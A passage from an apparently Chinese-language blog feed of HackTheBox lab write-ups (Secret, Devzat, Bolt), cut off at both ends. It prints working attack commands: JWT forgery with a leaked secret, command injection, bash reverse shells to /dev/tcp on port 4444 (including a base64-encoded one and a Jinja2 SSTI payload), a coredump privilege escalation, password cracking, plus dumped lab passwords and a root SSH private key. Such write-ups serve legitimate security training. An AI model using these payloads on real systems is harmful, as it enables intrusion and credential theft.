https://nmap.org ) at 2021-11-03 14:27 CSTNmap scan report for 10.10.11.120Host is up (0.078s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)| 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)|_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: DUMB Docs3000/tcp open http Node.js (Express middleware)|_http-title: DUMB DocsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 47.35 seconds 80live demo是api，也提供有源码下载： 3000看起来和80一样： 代码分析有git，git log里看到安全相关信息，回滚去查看内容,得到TOKEN_SECRET： 12345git reset --hard de0a46b5107a2f4d26e348303e76d85ae4870934$ cat .envDB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE 代码中jwt验证使用这个token secret： 注册根据代码，注册用户： 1curl -X POST -H 'Content-Type: application/json' http://10.10.11.120/api/user/register --data '&#123;\"name\": \"miaomiao\",\"email\": \"miao@miao.com\",\"password\": \"123456\"&#125;' 登录登录请求也同样： 12curl -X POST -H 'Content-Type: application/json' http://10.10.11.120/api/user/login --data '&#123;\"email\": \"miao@miao.com\",\"password\": \"123456\"&#125;'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgyMmY5MzQzZjlmMDA0NWVjZDIxNmUiLCJuYW1lIjoibWlhb21pYW8iLCJlbWFpbCI6Im1pYW9AbWlhby5jb20iLCJpYXQiOjE2MzU5MjE5MDB9.b7kefpccSt5L1FoQqO6ePzZgL0Px_9ojpdpH25nVmR8 private根据代码，priv验证admin，我们注册的是普通用户： 1curl http://10.10.11.120/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgyMmY5MzQzZjlmMDA0NWVjZDIxNmUiLCJuYW1lIjoibWlhb21pYW8iLCJlbWFpbCI6Im1pYW9AbWlhby5jb20iLCJpYXQiOjE2MzU5MjE5MDB9.b7kefpccSt5L1FoQqO6ePzZgL0Px_9ojpdpH25nVmR8' JWT 所以我们需要伪造JWT，修改用户名为theadmin： 123python3 ~/Tools/jwt_tool/jwt_tool.py -I -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgyMmY5MzQzZjlmMDA0NWVjZDIxNmUiLCJuYW1lIjoibWlhb21pYW8iLCJlbWFpbCI6Im1pYW9AbWlhby5jb20iLCJpYXQiOjE2MzU5MjE5MDB9.b7kefpccSt5L1FoQqO6ePzZgL0Px_9ojpdpH25nVmR8eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgyMmY5MzQzZjlmMDA0NWVjZDIxNmUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1pYW9AbWlhby5jb20iLCJpYXQiOjE2MzU5MjE5MDB9.qOT4UvOod18YKpBrqhxIte_0Jr2eShDAMiMmf2P2vY0 priv现在我们是admin： 1curl http://10.10.11.120/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgyMmY5MzQzZjlmMDA0NWVjZDIxNmUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1pYW9AbWlhby5jb20iLCJpYXQiOjE2MzU5MjE5MDB9.qOT4UvOod18YKpBrqhxIte_0Jr2eShDAMiMmf2P2vY0' 命令注入同样是代码中找到接口，routes/private.js里，明显的命令注入，这个要最新代码，之前找token reset过的需要还原回来： 1curl 'http://10.10.11.120/api/logs?file=;id' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgyMmY5MzQzZjlmMDA0NWVjZDIxNmUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1pYW9AbWlhby5jb20iLCJpYXQiOjE2MzU5MjE5MDB9.qOT4UvOod18YKpBrqhxIte_0Jr2eShDAMiMmf2P2vY0' shell &amp; user flag1curl \"http://10.10.11.120/api/logs?file=;bash%20-c%20'exec%20bash%20-i%20%26%3E/dev/tcp/10.10.14.4/4444%20%3C%261'\" -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgyMmY5MzQzZjlmMDA0NWVjZDIxNmUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1pYW9AbWlhby5jb20iLCJpYXQiOjE2MzU5MjE5MDB9.qOT4UvOod18YKpBrqhxIte_0Jr2eShDAMiMmf2P2vY0' 提权信息suid发现/opt/count 1find / -type f -perm -u=s 2&gt;/dev/null opt目录中提供代码，根据代码，启用了coredump，可以利用这一点： code.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;linux/limits.h&gt;void dircount(const char *path, char *summary)&#123; DIR *dir; char fullpath[PATH_MAX]; struct dirent *ent; struct stat fstat; int tot = 0, regular_files = 0, directories = 0, symlinks = 0; if((dir = opendir(path)) == NULL) &#123; printf(\"\\nUnable to open directory.\\n\"); exit(EXIT_FAILURE); &#125; while ((ent = readdir(dir)) != NULL) &#123; ++tot; strncpy(fullpath, path, PATH_MAX-NAME_MAX-1); strcat(fullpath, \"/\"); strncat(fullpath, ent-&gt;d_name, strlen(ent-&gt;d_name)); if (!lstat(fullpath, &amp;fstat)) &#123; if(S_ISDIR(fstat.st_mode)) &#123; printf(\"d\"); ++directories; &#125; else if(S_ISLNK(fstat.st_mode)) &#123; printf(\"l\"); ++symlinks; &#125; else if(S_ISREG(fstat.st_mode)) &#123; printf(\"-\"); ++regular_files; &#125; else printf(\"?\"); printf((fstat.st_mode &amp; S_IRUSR) ? \"r\" : \"-\"); printf((fstat.st_mode &amp; S_IWUSR) ? \"w\" : \"-\"); printf((fstat.st_mode &amp; S_IXUSR) ? \"x\" : \"-\"); printf((fstat.st_mode &amp; S_IRGRP) ? \"r\" : \"-\"); printf((fstat.st_mode &amp; S_IWGRP) ? \"w\" : \"-\"); printf((fstat.st_mode &amp; S_IXGRP) ? \"x\" : \"-\"); printf((fstat.st_mode &amp; S_IROTH) ? \"r\" : \"-\"); printf((fstat.st_mode &amp; S_IWOTH) ? \"w\" : \"-\"); printf((fstat.st_mode &amp; S_IXOTH) ? \"x\" : \"-\"); &#125; else &#123; printf(\"??????????\"); &#125; printf (\"\\t%s\\n\", ent-&gt;d_name); &#125; closedir(dir); snprintf(summary, 4096, \"Total entries = %d\\nRegular files = %d\\nDirectories = %d\\nSymbolic links = %d\\n\", tot, regular_files, directories, symlinks); printf(\"\\n%s\", summary);&#125;void filecount(const char *path, char *summary)&#123; FILE *file; char ch; int characters, words, lines; file = fopen(path, \"r\"); if (file == NULL) &#123; printf(\"\\nUnable to open file.\\n\"); printf(\"Please check if file exists and you have read privilege.\\n\"); exit(EXIT_FAILURE); &#125; characters = words = lines = 0; while ((ch = fgetc(file)) != EOF) &#123; characters++; if (ch == '\\n' || ch == '\\0') lines++; if (ch == ' ' || ch == '\\t' || ch == '\\n' || ch == '\\0') words++; &#125; if (characters &gt; 0) &#123; words++; lines++; &#125; snprintf(summary, 256, \"Total characters = %d\\nTotal words = %d\\nTotal lines = %d\\n\", characters, words, lines); printf(\"\\n%s\", summary);&#125;int main()&#123; char path[100]; int res; struct stat path_s; char summary[4096]; printf(\"Enter source file/directory name: \"); scanf(\"%99s\", path); getchar(); stat(path, &amp;path_s); if(S_ISDIR(path_s.st_mode)) dircount(path, summary); else filecount(path, summary); // drop privs to limit file write setuid(getuid()); // Enable coredump generation prctl(PR_SET_DUMPABLE, 1); printf(\"Save results a file? [y/N]: \"); res = getchar(); if (res == 121 || res == 89) &#123; printf(\"Path: \"); scanf(\"%99s\", path); FILE *fp = fopen(path, \"a\"); if (fp != NULL) &#123; fputs(summary, fp); fclose(fp); &#125; else &#123; printf(\"Could not open %s for writing\\n\", path); &#125; &#125; return 0;&#125; coredump &amp; root flag需要两个shell，一个运行count去读root.txt，选择保存结果到文件，不输入路径，另一个shell里kill -bus掉count，产生coredump： 之后解析crash文件，其中coredump文件存在相关内容 1234mkdir /tmp/miaoapport-unpack _opt_count.1000.crash /tmp/miaocd /tmp/miaostrings CoreDump root_id_rsa同样的方式获取root用户ssh私钥： 1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw&#x2F;hFlpRPaKRbi3KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+7wNrxitkPrmuViWPGQCotBDCZmn4WNbNT0kcsfA+b4xB+am6tyDthqjfPJngROf0Z26lA1xw0OmoCdyhvQ3azlbkZZ7EWeTtQ&#x2F;EYcdYofa8&#x2F;mbQ+amOb9YaqWGiBai69w0Hzf06lB8cx8G+KbGPcN174a666dRwDFmbrd9nc9E2YGn5aUfMkvbaJoqdHRHGCN1rI78J7rPRaTC8aTuBKexPVVXhBO6+e1htuO31rHMTHABt4+6K4wv7YvmXz3Ax4HIScfopVl7futnEaJPfHBdg25yXbi8lafKAGQHLZjD9vsyEi5wqoVOYalTXEXZwOrstp3Y93VKx4kGGBqovBKMtlRaic+YTv0vTW3fis9d7aMqLpuuFMEHxTQPyor3+&#x2F;aEHiLLAAAFiMxy1SzMctUsAAAAB3NzaC1yc2EAAAGBAJ+sy5Zu0DhhmcrVAjt0jaUeb3Q38Tc5X5FMOJzMP4RZaUT2ikW4tylGbASsoKDr85oc1mHLONd1AyalDFrPqPTsHqtL4sENUCZlcM76hYxTUsc1xFaI5qAnj8Pu8Da8YrZD65rlYljxkAqLQQwmZp+FjWzU9JHLHwPm+MQfmpurcg7Yao3zyZ4ETn9GdupQNccNDpqAncob0N2s5W5GWexFnk7UPxGHHWKH2vP5m0Pmpjm&#x2F;WGqlhogWouvcNB839OpQfHMfBvimxj3Dde+GuuunUcAxZm63fZ3PRNmBp+WlHzJL22iaKnR0RxgjdayO&#x2F;Ce6z0WkwvGk7gSnsT1VV4QTuvntYbbjt9axzExwAbePuiuML+2L5l89wMeByEnH6KVZe37rZxGiT3xwXYNucl24vJWnygBkBy2Yw&#x2F;b7MhIucKqFTmGpU1xF2cDq7Lad2Pd1SseJBhgaqLwSjLZUWonPmE79L01t34rPXe2jKi6brhTBB8U0D8qK9&#x2F;v2hB4iywAAAAMBAAEAAAGAGkWVDcBX1B8C7eOURXIM6DEUx3t43cw71C1FV08n2D&#x2F;Z2TXzVDtrL4hdt3srxq5r21yJTXfhd1nSVeZsHPjz5LCA71BCE99744VnRTblCEyhXxOSpWZLA+jed691qJvgZfrQ5iB9yQKd344&#x2F;+p7K3c5ckZ6MSvyvsrWrEqHcj2ZrEtQ62&#x2F;ZTowM0Yy6V3EGsR373eyZUT++5su+CpF1A6GYgAPpdEiY4CIEv3lqgWFC34uJ&#x2F;yrRHaVbIIaSOkuBi0h7Is562aoGp7&#x2F;9Q3j&#x2F;YUjKBtLvbvbNRxwM+sCWLasbK5xS7VvD569yMirw2xOibp3nHepmEJnYZKomzqmFsEvA1GbWiPdLCwsX7btbcp0tbjsD5dmAcU4nFJZI1vtYUKoNrmkI5WtvCC8bBvA4BglXPSrrj1pGP9QPVdUVyOc6QKSbfomyefO2HQqne6zy0N8QdAZ3dDzXfBlVfuPpdP8yqUnrVnzpL8U&#x2F;gc1ljKcSEx262jXKHAG3mTTNKtooZAAAAwQDPMrdvvNWrmiF9CSfTnc5v3TQfEDFCUCmtCEpTIQHhIxpiv+mocHjaPiBRnuKRPDsf81ainyiXYooPZqUT2lBDtIdJbid6G7oLoVbx4xDJ7h4+U70rpMb&#x2F;tWRBuM51v9ZXAlVUz14oKt+Rx9peAx7dEfTHNvfdauGJL6k3QyGo+90nQDripDIUPvE0sac1tFLrfvJHYHsYiS7hLMdFu1uEJvusaIbslVQqpAqgX5Ht75rd0BZytTC9Dx3b71YYSdoAAADBANMZ5ELPuRUDb0GhmXSlMvZVJEvlBISUVNM2YC+6hxh2Mc&#x2F;0Szh0060qZv9ub3DXCDXMrwR5o6mdKv&#x2F;kshpaD4Ml+fjgTzmOo&#x2F;kTaWpKWcHmSrlCiMi1YqWUM6k9OCfr7UTTd7&#x2F;uqkiYfLdCJGoWkehGGxeplJpUUj34t0PD8eMFnlfV8oomTvruqx0wWp6EmiyT9zjs2vJ3zapp2HWuaSdv7s2aF3gibcz04JxGYCePRKTBy&#x2F;kth9VFsAJ3eQezpwAAAMEAwaLVktNNw+sG&#x2F;Erdgt1i9&#x2F;vttCwVVhw9RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP96urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5&#x2F;VZ1W7PlxhDYPO15YxLBhWJ0J3G9v6SN&#x2F;YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL&#x2F;w5WJMelDW+l3kfO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- 参考资料 https://github.com/ticarpi/jwt_tool prctl(2) - Linux manual pagehttps://man7.org/linux/man-pages/man2/prctl.2.html http://manpages.ubuntu.com/manpages/bionic/man1/apport-unpack.1.html HTB secret discussion | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-secret-discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Devzat - HackTheBox","slug":"Devzat-HackTheBox","date":"2021-10-19T07:22:13.000Z","updated":"2022-03-14T06:49:33.542Z","comments":true,"path":"2021/10/19/Devzat-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/10/19/Devzat-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/398 10.10.11.118 端口扫描22,80,8000: 123456789101112131415161718192021222324252627$ nmap -sC -sV 10.10.11.118Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-19 14:02 CSTNmap scan report for 10.10.11.118Host is up (0.069s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)| 256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)|_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)80/tcp open http Apache httpd 2.4.41|_http-title: Did not follow redirect to http://devzat.htb/8000/tcp open ssh (protocol 2.0)| fingerprint-strings:| NULL:|_ SSH-2.0-Go| ssh-hostkey:|_ 3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8000-TCP:V=7.92%I=7%D=10/19%Time=616E5FA6%P=x86_64-apple-darwin20.4SF:.0%r(NULL,C,\"SSH-2\\.0-Go\\r\\n\");Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 64.93 seconds 80ip访问自动跳域名，加hosts： 80008000是SSH-2.0-Go，80界面那里也有提示： 根据相关信息可以搜到： quackduck/devzat: The devs are over here at devzat, chat over SSH!https://github.com/quackduck/devzat 测试连接，暂时没什么可利用的： 子域名子域名因为不存在的都会302，ffuf更适合处理，gobuster也能用： 12345gobuster vhost -u http://devzat.htb -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 | grep 200ffuf -c -u http://devzat.htb -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.devzat.htb\" -mc 200pets.devzat.htb pets.devzat.htb 有个添加功能，两个参数，json格式： git leak很容易发现git泄漏: 1gobuster dir -u http://pets.devzat.htb/ -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 --wildcard --exclude-length 510 代码审计git dump后代码审计，很明显的命令注入，添加宠物功能传入name和species参数，species参数直接拼接到cmd中： shellbase64编码，排除一些字符干扰： 1234echo &quot;bash -c &#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.5&#x2F;4444 &lt;&amp;1&#39;&quot; | base64YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNS80NDQ0IDwmMScK&#123;&quot;name&quot;:&quot;miao&quot;,&quot;species&quot;:&quot;cat;echo -n &#39;YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNS80NDQ0IDwmMScK&#39; | base64 -d | bash&quot;&#125; 当前patrick用户.ssh目录有私钥，ssh登录方便后续操作： 信息简单枚举可以发现本机开了几个端口，转发出去发现是InfluxDB： 1ssh -L 8086:127.0.0.1:8086 -i patrick_id_rsa patrick@10.10.11.118 InfluxDB搜到相关漏洞： https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933 数据库里得到用户名密码： 1234567891011121314151617181920212223242526272829303132333435363738&#123; \"results\": [ &#123; \"series\": [ &#123; \"columns\": [ \"time\", \"enabled\", \"password\", \"username\" ], \"name\": \"user\", \"values\": [ [ \"2021-06-22T20:04:16.313965493Z\", false, \"WillyWonka2021\", \"wilhelm\" ], [ \"2021-06-22T20:04:16.320782034Z\", true, \"woBeeYareedahc7Oogeephies7Aiseci\", \"catherine\" ], [ \"2021-06-22T20:04:16.996682002Z\", true, \"RoyalQueenBee$\", \"charles\" ] ] &#125; ], \"statement_id\": 0 &#125; ]&#125; catherine &amp; user flag得到了catherine用户密码，不能ssh，可以su切过去读取user.txt: 提权信息backups有两个zip，dev解压查看代码可以发现一个file command可以读文件，密码硬编码： root flag文件里可以知道端口是8443，file命令读取root.txt: 123&#x2F;file ..&#x2F;..&#x2F;root&#x2F;root.txt CeilingCatStillAThingIn2021?&#x2F;file ..&#x2F;..&#x2F;etc&#x2F;shadow CeilingCatStillAThingIn2021?&#x2F;file ..&#x2F;..&#x2F;root&#x2F;.ssh&#x2F;id_rsa CeilingCatStillAThingIn2021? 参考资料 quackduck/devzat: The devs are over here at devzat, chat over SSH!https://github.com/quackduck/devzat https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933 HTB Devzat [Discussion] | RaidForumshttps://rfmirror.com/Thread-Tutorial-HTB-Devzat-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Bolt - HackTheBox","slug":"Bolt-HackTheBox","date":"2021-10-13T06:40:20.000Z","updated":"2022-02-21T06:25:42.903Z","comments":true,"path":"2021/10/13/Bolt-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/10/13/Bolt-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/384 10.10.11.114 端口扫描22,80,443: 123456789101112131415161718192021222324252627$ nmap -sC -sV 10.10.11.114Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-12 14:10 CSTNmap scan report for 10.10.11.114Host is up (0.068s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)| 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)|_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Starter Website - About443/tcp open ssl/http nginx 1.18.0 (Ubuntu)|_ssl-date: TLS randomness does not represent time|_http-server-header: nginx/1.18.0 (Ubuntu)| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU| Not valid before: 2021-02-24T19:11:23|_Not valid after: 2022-02-24T19:11:23| http-title: Passbolt | Open source password manager for teams|_Requested resource was /auth/login?redirect=%2FService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 39.68 seconds 80 443 passbolt.bolt.htb加hosts后访问： image.tar80那里下载得到一个tar文件： 下载，解压，里面可以发现一个sqlite： sqlite3sqlite里得到admin密码hash： 11|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS&#x2F;6jlFDfF2J5q.|| hash crack破解出来密码是，deadbolt AdminLTE3账号密码登录80： direct chat主页direct chat里提示信息，其他平台： VHOST扫描，得到几个子域名： 1234gobuster vhost -u http://bolt.htb -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50Found: demo.bolt.htb (Status: 302) [Size: 219]Found: mail.bolt.htb (Status: 200) [Size: 4943] mail.bolt.htb demo.bolt.htb demo.bolt.htb两个子域名都不能用已有账号登录，demo可以注册, 注册需要邀请码可以在前面下载的文件里找到，进去之后可以看到功能明显比主站多： mail.bolt.htbdemo注册的账号也可以直接登录mail： SSTIdemo页面底部可以看到是Flask，那么可以尝试SSTI,更改会发一个确认邮件，点击后demo那里没生效，但会有一封新邮件告知已修改用户名，里面可以看到SSTI执行后结果： shell后面就是修改payload，得到shell： https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2 1&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen(&quot;bash -c &#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.12&#x2F;4444 &lt;&amp;1&#39;&quot;).read() &#125;&#125; 信息简单的枚举，发现/etc/passbolt里一些有用信息,php里得到数据库密码,home目录两个用户名 12345&#39;username&#39; &#x3D;&gt; &#39;passbolt&#39;,&#39;password&#39; &#x3D;&gt; &#39;rT2;jW7&lt;eY8!dX8&#125;pQ8%&#39;,clark eddie mysql数据库里user表没密码，但有个secret表里得到gpg加密信息： 12345678910111213141516171819202122-----BEGIN PGP MESSAGE-----Version: OpenPGP.js v4.10.9Comment: https:&#x2F;&#x2F;openpgpjs.orgwcBMA&#x2F;ZcqHmj13&#x2F;kAQgAkS&#x2F;2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5pscg&#x2F;ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+&#x2F;3LZgtpV&#x2F;PJCAD030kYpCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO&#x2F;BQnpJUJV71YOon6PNV71T2zFr3HoAFbR&#x2F;wPyF6Lpkwy56u3A2A6lbDb3sRl&#x2F;SVIj6xtXn+fICeHjvYEm2IrE4Pxl+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218RzyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7&#x2F;8b7nQpedLA7wF8tR9g8Tpy+ToQOozGKBy&#x2F;auqOHO66vA1EKJkYSZzMXxnp45XA38+ul0&#x2F;OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP&#x2F;MIgh5I0RkYwGCtoPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy&#x2F;RZJp7FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR&#x2F;+K72r39WiBEiE2WHVey5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU&#x2F;7tYNdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5aIebmi&#x2F;MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhsnO9&#x2F;aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6TQtOIti4o2sKEAFQnf7RDgpWeugbn&#x2F;vphihSA984&#x3D;P38i-----END PGP MESSAGE----- passbolt.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;?php/** * Passbolt ~ Open source password manager for teams * Copyright (c) Passbolt SA (https://www.passbolt.com) * * Licensed under GNU Affero General Public License version 3 of the or any later version. * For full copyright and license information, please see the LICENSE.txt * Redistributions of files must retain the above copyright notice. * * @copyright Copyright (c) Passbolt SA (https://www.passbolt.com) * @license https://opensource.org/licenses/AGPL-3.0 AGPL License * @link https://www.passbolt.com Passbolt(tm) * @since 2.0.0 *//** * PASSBOLT CONFIGURATION FILE * * This is a generated configuration file, which was generated by the passbolt web installer. * * To see all available options, you can refer to the default.php file, or replace this file * by a copy of passbolt.default.php * Do not modify default.php or you may break your upgrade process. * * Read more about how to install passbolt: https://www.passbolt.com/help/tech/install * Any issue, check out our FAQ: https://www.passbolt.com/faq * An installation issue? Ask for help to the community: https://community.passbolt.com/ */return [ 'App' =&gt; [ // A base URL to use for absolute links. // The url where the passbolt instance will be reachable to your end users. // This information is need to render images in emails for example 'fullBaseUrl' =&gt; 'https://passbolt.bolt.htb', ], // Database configuration. 'Datasources' =&gt; [ 'default' =&gt; [ 'host' =&gt; 'localhost', 'port' =&gt; '3306', 'username' =&gt; 'passbolt', 'password' =&gt; 'rT2;jW7&lt;eY8!dX8&#125;pQ8%', 'database' =&gt; 'passboltdb', ], ], // Email configuration. 'EmailTransport' =&gt; [ 'default' =&gt; [ 'host' =&gt; 'localhost', 'port' =&gt; 587, 'username' =&gt; null, 'password' =&gt; null, // Is this a secure connection? true if yes, null if no. 'tls' =&gt; true, //'timeout' =&gt; 30, //'client' =&gt; null, //'url' =&gt; null, ], ], 'Email' =&gt; [ 'default' =&gt; [ // Defines the default name and email of the sender of the emails. 'from' =&gt; ['localhost@bolt.htb' =&gt; 'localhost'], //'charset' =&gt; 'utf-8', //'headerCharset' =&gt; 'utf-8', ], ], 'passbolt' =&gt; [ // GPG Configuration. // The keyring must to be owned and accessible by the webserver user. // Example: www-data user on Debian 'gpg' =&gt; [ // Main server key. 'serverKey' =&gt; [ // Server private key fingerprint. 'fingerprint' =&gt; '59860A269E803FA094416753AB8E2EFB56A16C84', 'public' =&gt; CONFIG . DS . 'gpg' . DS . 'serverkey.asc', 'private' =&gt; CONFIG . DS . 'gpg' . DS . 'serverkey_private.asc', ], ], 'registration' =&gt; [ 'public' =&gt; false, ], 'ssl' =&gt; [ 'force' =&gt; true, ] ],]; user flag密码复用，数据库密码就是eddie用户密码，ssh登录，user.txt: GPGlinpeas发现邮件和私钥信息,邮件里提到密码管理系统和私钥备份，在log文件中发现私钥： 12345678[+] Mails (limit 50) 72480 4 -rw------- 1 eddie mail 909 Feb 25 2021 /var/mail/eddiePossible private SSH keys were found!/etc/ImageMagick-6/mime.xml/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log hash crackgpg私钥转换格式，破解出来密码，这一步比较费时间： 12gpg2john gpg.key &gt; hash.txtsudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txt decrypt之后就是导入私钥，解密前面数据库里得到的信息： 1234gpg --batch --import gpg.key.privgpg 